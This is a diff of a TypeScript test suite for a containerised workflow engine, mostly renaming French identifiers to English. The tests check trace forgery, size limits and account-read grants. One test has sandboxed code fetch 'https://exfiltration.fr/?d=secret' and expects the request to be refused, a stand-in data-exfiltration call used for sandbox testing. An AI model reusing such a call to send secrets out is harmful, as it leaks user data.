@@ -25,7 +25,7 @@ import { SEARCHES_CAP, SEARCHES_STOPPED, TOO_MANY_READS, fetch } from "../../src
 import { SEARCH_DENIED, UNREADABLE_RESULTS, extractResults, searchUrl } from "../../src/workflows/duckduckgo.js";
 import { Pacing } from "../../src/workflows/pacing.js";
 import { WEB_REQUIRED } from "../../src/workflows/validate.js";
-import { LINE_MAX_BYTES, DATA_MAX_SIZE } from "../../src/workflows/protocole.js";
+import { LINE_MAX_BYTES, DATA_MAX_SIZE } from "../../src/workflows/protocol.js";
 import { DATA_MAX_SIZE as HOME_DATA_MAX_SIZE } from "../../src/home/schemas.js";
 import { REPLAY_TOO_BIG } from "../../src/workflows/replay.js";
 import { paramsHash, type BlocksMemory } from "../../src/workflows/memory.js";
@@ -38,8 +38,8 @@ import { ACTION_STOPPED } from "../../src/workflows/executions.js";
 import type { Owner } from "../../src/workflows/schema.js";
 import type { DirectTrace } from "../../src/workflows/run.js";
 
-const ENGINE = join(import.meta.dirname, "..", "..", "docker", "moteur");
-const SCRIPT = join(ENGINE, "recolteur.mjs");
+const ENGINE = join(import.meta.dirname, "..", "..", "docker", "engine");
+const SCRIPT = join(ENGINE, "harvester.mjs");
 const NOW = new Date("2026-10-29T10:00:00.000Z");
 
 const toClose: { close(): Promise<void> }[] = [];
@@ -79,7 +79,7 @@ const valid = (raw: unknown) => {
 /** code (file `<id>.mjs`) → … → sortie, in a chain. */
 const chain = (...ids: string[]) => ({
   version: 1,
-  blocks: [...ids.map((id) => ({ id, type: "code", params: { source: `${id}.mjs` } })), { id: "sortie", type: "sortie", params: { to: "widget" } }],
+  blocks: [...ids.map((id) => ({ id, type: "code", params: { source: `${id}.mjs` } })), { id: "sortie", type: "output", params: { to: "widget" } }],
   links: [...ids, "sortie"].slice(1).map((to, i) => ({ from: [...ids, "sortie"][i]!, to: to })),
 });
 
@@ -177,10 +177,10 @@ const scriptedLauncher = (lignes: unknown[], code = 0): ProcessLauncher => () =>
 describe("executerWorkflow", () => {
   it("a code → sortie workflow returns fin with the value and a successful run block by block", async () => {
     const b = await bench(chain("a"), {
-      "a.mjs": `export default async (entree, w) => { w.journal("bonjour", 2); return [{ x: 1 }, { x: 2 }, w.config]; };`,
+      "a.mjs": `export default async (entree, w) => { w.log("bonjour", 2); return [{ x: 1 }, { x: 2 }, w.config]; };`,
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "fin", output: { to: "widget", value: [{ x: 1 }, { x: 2 }, { interests: "rust" }] }, memory: {} });
+    expect(r.issue).toEqual({ t: "end", output: { to: "widget", value: [{ x: 1 }, { x: 2 }, { interests: "rust" }] }, memory: {} });
     expect(r.run).toMatchObject({
       version: 1,
       id: "2026-10-29T10-00-00-000Z",
@@ -192,8 +192,8 @@ describe("executerWorkflow", () => {
     });
     expect(r.run.error).toBeUndefined();
     expect(r.run.blocks).toEqual([
-      { id: "a", type: "code", status: "reussi", start: NOW.toISOString(), end: NOW.toISOString(), items: 3, output: [{ x: 1 }, { x: 2 }, { interests: "rust" }], log: ["bonjour 2"] },
-      { id: "sortie", type: "sortie", status: "reussi", start: NOW.toISOString(), end: NOW.toISOString(), items: 3, output: [{ x: 1 }, { x: 2 }, { interests: "rust" }], log: [] },
+      { id: "a", type: "code", status: "succeeded", start: NOW.toISOString(), end: NOW.toISOString(), items: 3, output: [{ x: 1 }, { x: 2 }, { interests: "rust" }], log: ["bonjour 2"] },
+      { id: "sortie", type: "output", status: "succeeded", start: NOW.toISOString(), end: NOW.toISOString(), items: 3, output: [{ x: 1 }, { x: 2 }, { interests: "rust" }], log: [] },
     ]);
     // The global log keeps what the code writes (stderr), as before workflows.
     expect(r.log).toContain("bonjour 2");
@@ -217,17 +217,17 @@ describe("executerWorkflow", () => {
         version: 1,
         blocks: [
           { id: "liste", type: "code", params: { source: "liste.mjs" } },
-          { id: "lire", type: "source.recuperer", params: { url: "{url}", perItem: true } },
-          { id: "sortie", type: "sortie", params: { to: "widget" } },
+          { id: "lire", type: "source.fetch", params: { url: "{url}", perItem: true } },
+          { id: "sortie", type: "output", params: { to: "widget" } },
         ],
         links: [{ from: "liste", to: "lire" }, { from: "lire", to: "sortie" }],
       },
       { "liste.mjs": `export default async () => [{ url: "${web.url}/a" }, { url: "${web.url}/absente" }];` },
     );
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue.t).toBe("fin");
+    expect(r.issue.t).toBe("end");
     expect(r.run.status).toBe("partielle");
-    expect(r.run.blocks.map((x) => x.status)).toEqual(["reussi", "partiel", "reussi"]);
+    expect(r.run.blocks.map((x) => x.status)).toEqual(["succeeded", "partial", "succeeded"]);
     expect(r.run.blocks[1]!.output).toEqual([{ url: `${web.url}/a`, content: "contenu a" }, { url: `${web.url}/absente` }]);
     expect(r.run.blocks[1]!.log.join("\n")).toMatch(/404/);
   });
@@ -238,14 +238,14 @@ describe("executerWorkflow", () => {
       "b.mjs": `export default async (e) => e;`,
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "echec", error: "cassé : x", codeError: true });
+    expect(r.issue).toEqual({ t: "failure", error: "cassé : x", codeError: true });
     expect(r.run.status).toBe("echouee");
     expect(r.run.error).toBe("cassé : x");
     expect(r.run.kernelError).toBeUndefined();
     expect(r.run.blocks).toEqual([
-      { id: "a", type: "code", status: "echoue", start: NOW.toISOString(), end: NOW.toISOString(), items: null, error: "cassé : x", log: [] },
-      { id: "b", type: "code", status: "pas-lance", start: null, end: null, items: null, log: [] },
-      { id: "sortie", type: "sortie", status: "pas-lance", start: null, end: null, items: null, log: [] },
+      { id: "a", type: "code", status: "failed", start: NOW.toISOString(), end: NOW.toISOString(), items: null, error: "cassé : x", log: [] },
+      { id: "b", type: "code", status: "not-run", start: null, end: null, items: null, log: [] },
+      { id: "sortie", type: "output", status: "not-run", start: null, end: null, items: null, log: [] },
     ]);
   });
 
@@ -254,57 +254,57 @@ describe("executerWorkflow", () => {
       version: 1,
       blocks: [
         { id: "liste", type: "code", params: { source: "liste.mjs" } },
-        { id: "nouveaux", type: "liste.nouveaux", params: { key: "url" } },
-        { id: "sortie", type: "sortie", params: { to: "widget" } },
+        { id: "nouveaux", type: "list.new", params: { key: "url" } },
+        { id: "sortie", type: "output", params: { to: "widget" } },
       ],
       links: [{ from: "liste", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }],
     };
     const files = { "liste.mjs": `export default async () => [{ url: "a" }, { url: "b" }];` };
     const first = await bench(workflow, files);
     const r1 = await runWorkflow(first.ctx, first.infra);
-    expect(r1.issue.t === "fin" && r1.issue.output.value).toEqual([{ url: "a" }, { url: "b" }]);
-    const memory = r1.issue.t === "fin" ? r1.issue.memory : null;
-    expect(memory?.nouveaux?.type).toBe("liste.nouveaux");
+    expect(r1.issue.t === "end" && r1.issue.output.value).toEqual([{ url: "a" }, { url: "b" }]);
+    const memory = r1.issue.t === "end" ? r1.issue.memory : null;
+    expect(memory?.nouveaux?.type).toBe("list.new");
 
     // The memory is sent back to the container: nothing new next time. An entry of another block does not pass.
-    const second = await bench(workflow, files, { memory: { ...memory!, elsewhere: { type: "liste.nouveaux", value: [] } } });
+    const second = await bench(workflow, files, { memory: { ...memory!, elsewhere: { type: "list.new", value: [] } } });
     const r2 = await runWorkflow(second.ctx, second.infra);
-    expect(r2.issue.t === "fin" && r2.issue.output.value).toEqual([]);
-    expect(r2.issue.t === "fin" && Object.keys(r2.issue.memory ?? {})).toEqual(["nouveaux"]);
+    expect(r2.issue.t === "end" && r2.issue.output.value).toEqual([]);
+    expect(r2.issue.t === "end" && Object.keys(r2.issue.memory ?? {})).toEqual(["nouveaux"]);
   });
 
   it("a trace for an unknown or malformed block is ignored", async () => {
     const b = await bench(chain("a"), {
       "a.mjs": `export default async () => {
         const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
-        l({ t: "bloc", id: "inconnu", etape: "debut" });
-        l({ t: "bloc", id: "inconnu", etape: "fin", statut: "reussi", sortie: 1 });
-        l({ t: "journal", bloc: "inconnu", texte: "x" });
-        l({ t: "bloc", id: "sortie", etape: "fin", statut: "bizarre" });
-        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
+        l({ t: "block", id: "inconnu", step: "start" });
+        l({ t: "block", id: "inconnu", step: "end", status: "succeeded", sortie: 1 });
+        l({ t: "log", block: "inconnu", text: "x" });
+        l({ t: "block", id: "sortie", step: "end", status: "bizarre" });
+        l({ t: "block", id: "sortie", step: "end", status: "succeeded", output: "forgée" });
         process.stdout.write("pas du json\\n");
         return 1;
       };`,
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: 1 } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: 1 } });
     expect(r.run.blocks.map((x) => x.id)).toEqual(["a", "sortie"]);
-    expect(r.run.blocks[1]).toMatchObject({ status: "reussi", output: 1 });
+    expect(r.run.blocks[1]).toMatchObject({ status: "succeeded", output: 1 });
   });
 
   it("a forged trace for a block that is not the next one does not count", async () => {
     const b = await bench(chain("a", "b"), {
       "a.mjs": `export default async () => {
         const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
-        l({ t: "bloc", id: "b", etape: "debut" });
-        l({ t: "bloc", id: "b", etape: "fin", statut: "reussi", sortie: "forgée" });
+        l({ t: "block", id: "b", step: "start" });
+        l({ t: "block", id: "b", step: "end", status: "succeeded", output: "forgée" });
         throw new Error("cassé");
       };`,
       "b.mjs": `export default async (e) => e;`,
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "echec", error: "cassé" });
-    expect(r.run.blocks.map((x) => x.status)).toEqual(["echoue", "pas-lance", "pas-lance"]);
+    expect(r.issue).toMatchObject({ t: "failure", error: "cassé" });
+    expect(r.run.blocks.map((x) => x.status)).toEqual(["failed", "not-run", "not-run"]);
     expect(r.run.blocks[1]!.output).toBeUndefined();
   });
 
@@ -313,35 +313,35 @@ describe("executerWorkflow", () => {
       version: 1,
       blocks: [
         { id: "amont", type: "code", params: { source: "amont.mjs" } },
-        { id: "nouveaux", type: "liste.nouveaux", params: { key: "url" } },
-        { id: "sortie", type: "sortie", params: { to: "widget" } },
+        { id: "nouveaux", type: "list.new", params: { key: "url" } },
+        { id: "sortie", type: "output", params: { to: "widget" } },
       ],
       links: [{ from: "amont", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }],
     };
     const b = await bench(workflow, {}, {
       launch: scriptedLauncher([
-        { t: "memoire", memory: { newItems: { type: "liste.nouveaux", value: ["premiere"] } } },
-        { t: "memoire", memory: { newItems: { type: "liste.nouveaux", value: ["x"] }, other: { type: "liste.nouveaux", value: 1 }, output: { type: "code", value: 2 } } },
-        { t: "memoire", memory: "pas un objet" },
-        { t: "fin", data: [] },
-        { t: "memoire", memory: { newItems: { type: "liste.nouveaux", value: ["après fin"] } } },
+        { t: "memory", memory: { nouveaux: { type: "list.new", value: ["premiere"] } } },
+        { t: "memory", memory: { nouveaux: { type: "list.new", value: ["x"] }, other: { type: "list.new", value: 1 }, output: { type: "code", value: 2 } } },
+        { t: "memory", memory: "pas un objet" },
+        { t: "end", data: [] },
+        { t: "memory", memory: { nouveaux: { type: "list.new", value: ["après fin"] } } },
       ]),
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "fin", output: { to: "widget", value: [] }, memory: { newItems: { type: "liste.nouveaux", value: ["x"], hash: paramsHash({ key: "url" }) } } });
+    expect(r.issue).toEqual({ t: "end", output: { to: "widget", value: [] }, memory: { nouveaux: { type: "list.new", value: ["x"], hash: paramsHash({ key: "url" }) } } });
     // No block trace received: a block never started stays pas-lance.
-    expect(r.run.blocks.map((x) => x.status)).toEqual(["pas-lance", "pas-lance", "pas-lance"]);
+    expect(r.run.blocks.map((x) => x.status)).toEqual(["not-run", "not-run", "not-run"]);
   });
 
   it("a memory over 3 MB is dropped with a note in the log", async () => {
-    const b = await bench({ version: 1, blocks: [{ id: "amont", type: "code", params: { source: "amont.mjs" } }, { id: "nouveaux", type: "liste.nouveaux", params: { key: "url" } }, { id: "sortie", type: "sortie" , params: { to: "widget" } }], links: [{ from: "amont", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }] }, {}, {
+    const b = await bench({ version: 1, blocks: [{ id: "amont", type: "code", params: { source: "amont.mjs" } }, { id: "nouveaux", type: "list.new", params: { key: "url" } }, { id: "sortie", type: "output" , params: { to: "widget" } }], links: [{ from: "amont", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }] }, {}, {
       launch: scriptedLauncher([
-        { t: "memoire", memory: { newItems: { type: "liste.nouveaux", value: "x".repeat(3.5 * 1024 * 1024) } } },
-        { t: "fin", data: 1 },
+        { t: "memory", memory: { nouveaux: { type: "list.new", value: "x".repeat(3.5 * 1024 * 1024) } } },
+        { t: "end", data: 1 },
       ]),
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", memory: null });
+    expect(r.issue).toMatchObject({ t: "end", memory: null });
     expect(r.log).toContain(MEMORY_NOT_KEPT);
     // Also in the run, in the output block's log.
     expect(r.run.blocks.find((x) => x.id === "sortie")!.log).toEqual([MEMORY_NOT_KEPT]);
@@ -350,88 +350,88 @@ describe("executerWorkflow", () => {
   it("a trace of a started block without an end gives it failed; block log bounded to 200 lines of 500 characters", async () => {
     const b = await bench(chain("a"), {}, {
       launch: scriptedLauncher([
-        { t: "bloc", id: "a", step: "debut" },
-        ...Array.from({ length: 250 }, (_, i) => ({ t: "journal", block: "a", text: `${i} ${"y".repeat(800)}` })),
-        { t: "echec", error: "arrêt" },
+        { t: "block", id: "a", step: "start" },
+        ...Array.from({ length: 250 }, (_, i) => ({ t: "log", block: "a", text: `${i} ${"y".repeat(800)}` })),
+        { t: "failure", error: "arrêt" },
       ], 1),
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "echec", error: "arrêt", codeError: true });
+    expect(r.issue).toEqual({ t: "failure", error: "arrêt", codeError: true });
     const a = r.run.blocks[0]!;
-    expect(a.status).toBe("echoue");
+    expect(a.status).toBe("failed");
     expect(a.log).toHaveLength(200);
     expect(a.log[0]).toMatch(/51 lignes coupées/);
     expect(a.log[199]!.startsWith("249 ")).toBe(true);
     expect(a.log.every((l) => l.length <= 500)).toBe(true);
-    expect(r.run.blocks[1]!.status).toBe("pas-lance");
+    expect(r.run.blocks[1]!.status).toBe("not-run");
   });
 
   it("a 5 MB output (huge page) arrives truncated and marked, without stopping the run", async () => {
     const b = await bench(chain("enorme", "moyenne", "court"), {
       "enorme.mjs": `export default async () => "x".repeat(5 * 1024 * 1024);`,
       "moyenne.mjs": `export default async (e) => e.slice(0, 1024 * 1024);`,
-      "court.mjs": `export default async (e) => ({ longueur: e.length });`,
+      "court.mjs": `export default async (e) => ({ length: e.length });`,
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: { length: 1024 * 1024 } } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: { length: 1024 * 1024 } } });
     expect(r.run.status).toBe("reussie");
     const [huge, medium, short] = r.run.blocks;
-    expect(huge).toMatchObject({ status: "reussi", outputTruncated: true });
+    expect(huge).toMatchObject({ status: "succeeded", outputTruncated: true });
     expect(huge!.output).toBeUndefined();
-    expect(medium).toMatchObject({ status: "reussi", outputTruncated: true });
+    expect(medium).toMatchObject({ status: "succeeded", outputTruncated: true });
     expect(typeof medium!.output).toBe("string");
     expect(Buffer.byteLength(medium!.output as string)).toBeLessThanOrEqual(OUTPUT_MAX_BYTES);
     expect((medium!.output as string).startsWith('"xxx')).toBe(true);
-    expect(short).toMatchObject({ status: "reussi", output: { length: 1024 * 1024 } });
+    expect(short).toMatchObject({ status: "succeeded", output: { length: 1024 * 1024 } });
     expect(short!.outputTruncated).toBeUndefined();
   });
 
   it("lirePage with an account without a grant: accord-requis stop", async () => {
     const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [] } });
-    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { account: ["app.daily.dev"], grant: null, bridge: bridge });
+    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => w.readPage("https://app.daily.dev/", { account: true });` }, { account: ["app.daily.dev"], grant: null, bridge: bridge });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "arret", status: "accord-requis", error: "Accord requis pour lire avec ton compte : app.daily.dev" });
+    expect(r.issue).toEqual({ t: "stop", status: "accord-requis", error: "Accord requis pour lire avec ton compte : app.daily.dev" });
     expect(r.run).toMatchObject({ status: "accord-requis", error: "Accord requis pour lire avec ton compte : app.daily.dev", kernelError: true });
-    expect(r.run.blocks[0]!.status).toBe("echoue");
+    expect(r.run.blocks[0]!.status).toBe("failed");
     expect(bridge.calls.filter((a) => a.method === "lirePageInvisible")).toHaveLength(0);
     expect(b.deleted).toEqual(["essai", "essai"]);
   });
 
   it("ProfileDenied: onProfileDenied called, PROFILE_DENIED stop", async () => {
     const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [], deny: ["perso"] } });
-    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => w.lirePage("https://app.daily.dev/", { compte: true });` }, { account: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge });
+    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => w.readPage("https://app.daily.dev/", { account: true });` }, { account: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge });
     const r = await runWorkflow(b.ctx, b.infra);
     expect(b.denialPending).toBe(1);
-    expect(r.issue).toEqual({ t: "arret", status: "accord-requis", error: PROFILE_DENIED });
+    expect(r.issue).toEqual({ t: "stop", status: "accord-requis", error: PROFILE_DENIED });
     expect(r.run.status).toBe("accord-requis");
   });
 
   it("an early fin written by the code: partial run, following blocks pas-lance", async () => {
     const b = await bench(chain("a", "b"), {
       "a.mjs": `export default async () => {
-        process.stdout.write(JSON.stringify({ t: "fin", donnees: "tôt" }) + "\\n");
+        process.stdout.write(JSON.stringify({ t: "end", data: "tôt" }) + "\\n");
         await new Promise((ok) => setTimeout(ok, 50));
         process.exit(0);
       };`,
       "b.mjs": `export default async (e) => e;`,
     });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: "tôt" } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: "tôt" } });
     expect(r.run.status).toBe("partielle");
-    expect(r.run.blocks.map((x) => x.status)).toEqual(["echoue", "pas-lance", "pas-lance"]);
+    expect(r.run.blocks.map((x) => x.status)).toEqual(["failed", "not-run", "not-run"]);
   });
 
   it("grant removed between two reads with an account: accord-requis stop, no second read", async () => {
     const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [{ url: "https://app.daily.dev/", title: "Fil", text: "articles", links: [] }] } });
     const b = await bench(
       chain("a"),
-      { "a.mjs": `export default async (e, w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); return w.lirePage("https://app.daily.dev/", { compte: true }); };` },
+      { "a.mjs": `export default async (e, w) => { await w.readPage("https://app.daily.dev/", { account: true }); return w.readPage("https://app.daily.dev/", { account: true }); };` },
       { account: ["app.daily.dev"], bridge: bridge },
     );
     let reads = 0;
     b.ctx.grant = async () => (reads++ === 0 ? { profile: "perso" } : null);
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toEqual({ t: "arret", status: "accord-requis", error: "Accord requis pour lire avec ton compte : app.daily.dev" });
+    expect(r.issue).toEqual({ t: "stop", status: "accord-requis", error: "Accord requis pour lire avec ton compte : app.daily.dev" });
     expect(r.run.status).toBe("accord-requis");
     expect(bridge.calls.filter((a) => a.method === "lirePageInvisible")).toHaveLength(1);
     expect(b.deleted).toEqual(["essai", "essai"]);
@@ -439,9 +439,9 @@ describe("executerWorkflow", () => {
 
   it("lirePage with an account and a grant: the bridge receives the profile and the declared domains", async () => {
     const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [{ url: "https://app.daily.dev/", title: "Fil", text: "articles", links: [] }] } });
-    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;` }, { account: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge });
+    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => (await w.readPage("https://app.daily.dev/", { account: true })).text;` }, { account: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge });
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: "articles" } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: "articles" } });
     expect(bridge.calls.find((a) => a.method === "lirePageInvisible")!.args).toEqual(["https://app.daily.dev/", { profile: "perso", domains: ["app.daily.dev"], localAddresses: true }]);
   });
 
@@ -452,16 +452,16 @@ describe("executerWorkflow", () => {
       {
         "a.mjs": `const essai = (p) => p.then(() => "ok", (e) => "refus: " + e.message);
         export default async (e, w) => [
-          await essai(w.lirePage("https://app.daily.dev/a", { defiler: 8 })),
-          await essai(w.lirePage("https://app.daily.dev/b", { compte: true, defiler: 2 })),
-          await essai(w.lirePage("https://app.daily.dev/c", { defiler: 0 })),
-          await essai(w.lirePage("https://app.daily.dev/d", { defiler: 21 })),
+          await essai(w.readPage("https://app.daily.dev/a", { scroll: 8 })),
+          await essai(w.readPage("https://app.daily.dev/b", { account: true, scroll: 2 })),
+          await essai(w.readPage("https://app.daily.dev/c", { scroll: 0 })),
+          await essai(w.readPage("https://app.daily.dev/d", { scroll: 21 })),
         ];`,
       },
       { account: ["app.daily.dev"], public: ["app.daily.dev"], grant: { profile: "perso" }, bridge: bridge },
     );
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "fin", output: { value: ["ok", "ok", "ok", "refus: Arguments invalides pour lirePage"] } });
+    expect(r.issue).toMatchObject({ t: "end", output: { value: ["ok", "ok", "ok", "refus: Arguments invalides pour readPage"] } });
     expect(bridge.calls.filter((a) => a.method === "lirePageInvisible").map((a) => a.args)).toEqual([
       ["https://app.daily.dev/a", { profile: null, domains: ["app.daily.dev"], localAddresses: true, scroll: 8 }],
       ["https://app.daily.dev/b", { profile: "perso", domains: ["app.daily.dev"], localAddresses: true, scroll: 2 }],
@@ -477,16 +477,16 @@ describe("executerWorkflow", () => {
       {
         "a.mjs": `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
         export default async (e, w) => [
-          await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
-          await essai(w.recuperer("http://localhost:${web.port}/")),
-          await essai(w.lirePage("https://exfiltration.fr/")),
-          await essai(w.recuperer("${web.url}/")),
+          await essai(w.fetch("https://exfiltration.fr/?d=secret")),
+          await essai(w.fetch("http://localhost:${web.port}/")),
+          await essai(w.readPage("https://exfiltration.fr/")),
+          await essai(w.fetch("${web.url}/")),
         ];`,
       },
       { account: ["app.daily.dev"], public: ["127.0.0.1"], grant: { profile: "perso" }, bridge: bridge },
     );
     const r = await runWorkflow(b.ctx, b.infra);
-    const [external, otherName, page, declare] = (r.issue.t === "fin" ? r.issue.output.value : []) as string[];
+    const [external, otherName, page, declare] = (r.issue.t === "end" ? r.issue.output.value : []) as string[];
     expect(external).toMatch(/^refus: .*non déclaré/);
     expect(otherName).toMatch(/^refus: .*non déclaré/);
     expect(page).toMatch(/^refus: .*non déclaré/);
@@ -503,7 +503,7 @@ describe("executerWorkflow", () => {
       gemma: (g) => (signals.push(g.signal), new Promise(() => {})),
     };
     const r = await runWorkflow(b.ctx, b.infra);
-    expect(r.issue).toMatchObject({ t: "arret", error: "Délai dépassé" });
+    expect(r.issue).toMatchObject({ t: "stop", error: "Délai dépassé" });
     expect(signals).toHaveLength(2);
     expect(signals.every((s) => s?.aborted)).toBe(true);
   });
@@ -513,9 +513,9 @@ describe("executerWorkflow", () => {
     const start = Date.now();
     const r = await runWorkflow(b.ctx, b.infra);
     expect(Date.now() - start).toBeLessThan(5000);
-    expect(r.issue).toEqual({ t: "arret", status: "erreur", error: "Délai dépassé" });
+    expect(r.issue).toEqual({ t: "stop", status: "erreur", error: "Délai dépassé" });
     expect(r.run).toMatchObject({ status: "echouee", error: "Délai dépassé", kernelError: true });
-    expect(r.run.blocks.map((x) => x.status)).toEqual(["echoue", "pas-lance"]);
+    expect(r.run.blocks.map((x) => x.status)).toEqual(["failed", "not-run"]);
     expect(b.killed).toBeGreaterThan(0);
     expect(b.deleted).toEqual(["essai", "essai"]);
     expect(RUN_DELAY_MS).toBe(200_000);
@@ -525,7 +525,7 @@ describe("executerWorkflow", () => {
     const received: string[] = [];
     const b = await bench(chain("a"), {}, {
       launch: () => {
-        const p = scriptedLauncher([{ t: "fin", data: null }])("", []);
+        const p = scriptedLauncher([{ t: "end", data: null }])("", []);
         p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
         return p;
       },
@@ -535,13 +535,13 @@ describe("executerWorkflow", () => {
     await runWorkflow(b.ctx, b.infra);
     const lignes = received.join("").trim().split("\n").map((l) => JSON.parse(l));
     expect(lignes[0]).toEqual({
-      t: "debut",
+      t: "start",
       previous: { old: true },
       now: NOW.toISOString(),
       config: { interests: "rust" },
       workflow: { blocks: b.ctx.valid.workflow.blocks, links: b.ctx.valid.workflow.links, order: ["a", "sortie"] },
     });
-    expect(lignes[1]).toEqual({ t: "memoire", memory: { a: { type: "code", value: 1 } } });
+    expect(lignes[1]).toEqual({ t: "memory", memory: { a: { type: "code", value: 1 } } });
   });
 
   /** The lines the container receives (start, memory) and the returned memory, for a workflow `a` → `sortie`. */
@@ -549,7 +549,7 @@ describe("executerWorkflow", () => {
     const received: string[] = [];
     const b = await bench(workflow, {}, {
       launch: () => {
-        const p = scriptedLauncher([{ t: "memoire", memory: rendered }, { t: "fin", data: null }])("", []);
+        const p = scriptedLauncher([{ t: "memory", memory: rendered }, { t: "end", data: null }])("", []);
         p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
         return p;
       },
@@ -557,7 +557,7 @@ describe("executerWorkflow", () => {
     });
     const r = await runWorkflow(b.ctx, b.infra);
     const lignes = received.join("").trim().split("\n").map((l) => JSON.parse(l));
-    return { sent: lignes[1].memoire as BlocksMemory, rendered: r.issue.t === "fin" ? r.issue.memory : null, ctx: b.ctx };
+    return { sent: lignes[1].memory as BlocksMemory, rendered: r.issue.t === "end" ? r.issue.memory : null, ctx: b.ctx };
   }
 
   it("a memory whose hash no longer matches the parameters is not sent to the container", async () => {
@@ -565,17 +565,17 @@ describe("executerWorkflow", () => {
       version: 1,
       blocks: [
         { id: "a", type: "code", params: { source: "a.mjs" } },
-        { id: "n", type: "liste.nouveaux", params: { key: key } },
-        { id: "sortie", type: "sortie", params: { to: "widget" } },
+        { id: "n", type: "list.new", params: { key: key } },
+        { id: "sortie", type: "output", params: { to: "widget" } },
       ],
       links: [{ from: "a", to: "n" }, { from: "n", to: "sortie" }],
     });
     const memory: BlocksMemory = {
-      n: { type: "liste.nouveaux", value: ["x"], hash: paramsHash({ key: "url" }) },
+      n: { type: "list.new", value: ["x"], hash: paramsHash({ key: "url" }) },
       a: { type: "code", value: 1 }, // old memory without a hash: accepted once
     };
     const same = await memoryViewedByContainer(wf("url"), memory);
-    expect(same.sent).toEqual({ n: { type: "liste.nouveaux", value: ["x"] }, a: { type: "code", value: 1 } }); // without the hash
+    expect(same.sent).toEqual({ n: { type: "list.new", value: ["x"] }, a: { type: "code", value: 1 } }); // without the hash
     const others = await memoryViewedByContainer(wf("titre"), memory);
     expect(others.sent).toEqual({ a: { type: "code", value: 1 } });
   });
@@ -587,13 +587,13 @@ describe("executerWorkflow", () => {
       version: 1,
       blocks: [
         { id: "a", type: "code", params: { source: "a.mjs" } },
-        { id: "n", type: "liste.nouveaux", params: { key: key } },
-        { id: "sortie", type: "sortie", params: { to: "widget" } },
+        { id: "n", type: "list.new", params: { key: key } },
+        { id: "sortie", type: "output", params: { to: "widget" } },
       ],
       links: [{ from: "a", to: "n" }, { from: "n", to: "sortie" }],
     });
-    const first = await memoryViewedByContainer(wf("url"), {}, { n: { type: "liste.nouveaux", value: ["vu"] } });
-    expect(first.rendered).toEqual({ n: { type: "liste.nouveaux", value: ["vu"], hash: paramsHash({ key: "url" }) } });
+    const first = await memoryViewedByContainer(wf("url"), {}, { n: { type: "list.new", value: ["vu"] } });
+    expect(first.rendered).toEqual({ n: { type: "list.new", value: ["vu"], hash: paramsHash({ key: "url" }) } });
     // workflow.json changed (cle: titre): the second run receives an empty memory for this block.
     const second = await memoryViewedByContainer(wf("titre"), first.rendered!);
     expect(second.sent).toEqual({});
@@ -613,30 +613,30 @@ describe("executerWorkflow", () => {
       b.ctx.trigger = "rejeu";
       b.ctx.replay = replayFromC;
       const r = await runWorkflow(b.ctx, b.infra);
-      expect(r.issue).toEqual({ t: "fin", output: { to: "widget", value: [10, 20] }, memory: null });
+      expect(r.issue).toEqual({ t: "end", output: { to: "widget", value: [10, 20] }, memory: null });
       expect(r.run.status).toBe("reussie");
       expect(r.run.trigger).toBe("rejeu");
       expect(r.run.blocks).toEqual([
-        { id: "a", type: "code", status: "pas-lance", start: null, end: null, items: null, log: [] },
-        { id: "b", type: "code", status: "repris", start: null, end: null, items: 2, log: [] },
-        { id: "c", type: "code", status: "reussi", start: T, end: T, items: 2, output: [10, 20], log: [] },
-        { id: "sortie", type: "sortie", status: "reussi", start: T, end: T, items: 2, output: [10, 20], log: [] },
+        { id: "a", type: "code", status: "not-run", start: null, end: null, items: null, log: [] },
